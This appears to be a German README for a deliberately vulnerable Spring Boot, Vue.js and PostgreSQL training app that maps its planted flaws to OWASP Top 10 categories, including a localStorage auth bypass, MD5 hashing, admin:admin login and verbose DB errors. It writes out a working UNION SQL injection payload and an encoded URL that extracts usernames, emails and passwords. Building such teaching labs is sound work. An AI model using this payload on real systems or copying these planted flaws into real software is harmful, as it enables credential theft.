# Spring Boot + Vuejs + Postgresql Server mit OWASP Top 10 

## A01:2021 – Fehler in der Zugriffskontrolle

Fehler: 
 - Auth ByPass mit Localstorage Item 
 - APIs generell unprotected
 - Url manipulation Orders

## A02:2021 – Cryptographic Failure

Fehler:
  - MD5 Hashing

## A03:2021 – Injection

Detail View Parameter ist angreifbar mit Sql Injection

Normale Query: 

```sql

SELECT * FROM orders JOIN  accounts on orders.userid = accounts.did where orders.did = 1
```

Union Injection: 

```sql
SELECT * FROM orders JOIN  accounts on orders.userid = accounts.did where orders.did = 1
UNION
SELECT 999, 999, '999' const, 999, did, username,email, password  FROM accounts where did = 1;
```

Example (URI encoded): 

http://localhost/detail/1222%20UNION%20SELECT%20999%2C%20999%2C%20'999'%20const%2C%20999%2C%20did%2C%20username%2Cemail%2C%20password%20%20FROM%20accounts%20where%20did%20%3D%201%3B

## A07:2021 – Identification and Authentication Failures
Fehler:
  - Identification mit session Id (kann geändert werden im Localstorage)
  - admin:admin zugang
  - Cred Stuffing

## A09:2021 – Security Logging and Monitoring Failures 
Fehler:
  - Logging von DB Fehlern direkt an die User 
  - kein Logging von Zugriffen



